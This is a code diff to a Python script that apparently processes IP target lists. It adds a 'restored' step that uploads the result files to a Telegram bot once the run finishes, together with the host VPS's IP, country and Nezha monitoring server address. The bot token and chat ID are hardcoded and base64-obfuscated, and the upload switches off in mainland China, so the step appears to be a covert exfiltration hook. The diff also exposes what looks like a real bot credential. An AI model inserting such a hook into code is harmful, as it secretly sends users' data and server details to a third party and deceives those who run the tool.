         run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
+        
         if interrupted:
             print(f"\n=== 🛑 脚本已被中断，中止前共运行 {run_time_str} ===")
         else:
             print(f"\n=== 🎉 全部完成！总用时 {run_time_str} ===")
-        # Telegram upload logic can be added here if needed.
+
+        # --- 从这里开始是恢复的Telegram上传逻辑 ---
+        vps_ip, vps_country = get_vps_info()
+        nezha_server = get_nezha_server()
+        total_ips = len(all_lines)
+
+        def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
+            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
+                print(f"⚠️  Telegram 上传跳过：文件 {file_path} 不存在或为空")
+                return
+
+            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+            caption = (
+                f"VPS: {kwargs.get('vps_ip', 'N/A')} ({kwargs.get('vps_country', 'N/A')})\n"
+                f"总目标数: {kwargs.get('total_ips', 0)}\n"
+                f"总用时: {kwargs.get('run_time_str', 'N/A')}\n"
+            )
+            if kwargs.get('nezha_server') != "N/A":
+                caption += f"哪吒Server: {kwargs.get('nezha_server')}\n"
+            caption += f"任务结果: {os.path.basename(file_path)}"
+            
+            with open(file_path, "rb") as f:
+                files = {'document': f}
+                data = {'chat_id': chat_id, 'caption': caption}
+                try:
+                    response = requests.post(url, data=data, files=files, timeout=60)
+                    if response.status_code == 200:
+                        print(f"✅ 文件 {file_path} 已发送到 Telegram")
+                    else:
+                        print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
+                except Exception as e:
+                    print(f"❌ 发送到 TG 失败：{e}")
+    
+        BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
+        CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
+        
+        try:
+            BOT_TOKEN = base64.b64decode(BOT_TOKEN_B64).decode('utf-8')
+            CHAT_ID = base64.b64decode(CHAT_ID_B64).decode('utf-8')
+        except (binascii.Error, UnicodeDecodeError):
+            BOT_TOKEN, CHAT_ID = BOT_TOKEN_B64, CHAT_ID_B64
+            print("\n" + "="*50)
+            print("⚠️  警告：Telegram 的 BOT_TOKEN 或 CHAT_ID 未经 Base64 加密。")
+            print("="*50)
+
+        if is_china_env:
+            print("\n🇨🇳 检测到国内环境，已禁用 Telegram 上传功能。")
+        elif BOT_TOKEN and CHAT_ID:
+            files_to_send = []
+            if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
+            if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
+            
+            for f_path in files_to_send:
+                print(f"\n📤 正在将 {f_path} 上传至 Telegram ...")
+                send_to_telegram(f_path, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, 
+                                 nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
